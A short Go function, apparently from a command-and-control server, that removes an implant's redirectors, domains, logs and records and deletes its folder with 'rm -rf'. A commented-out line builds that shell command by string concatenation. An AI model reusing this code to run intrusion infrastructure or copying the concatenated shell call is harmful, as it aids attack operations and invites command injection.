	redirectorsIds,err2 := getAllRidbyImplantNameDB(name)
	if err2 != nil{
		return err2.Error()
	}

	//remove reds, liberate domains,remove infra. TO-DO: Search domainId per implant itself! (for SaaS's)
	for _,rid := range redirectorsIds {
		dname,_ := getDomainbyRidDB(rid)
		setUsedDomainDB(dname,"No")
		rmLogsbyPidDB(rid)
		rmRedbyRidDB(rid)
	}

	rmImplantDB(name)
	//rmdir := exec.Command("/bin/sh","-c","rm -rf "+implantFolder)
	rmdir := exec.Command("/bin/rm","-rf",implantFolder)
	rmdir.Start()
	rmdir.Wait()
	return "Done"
}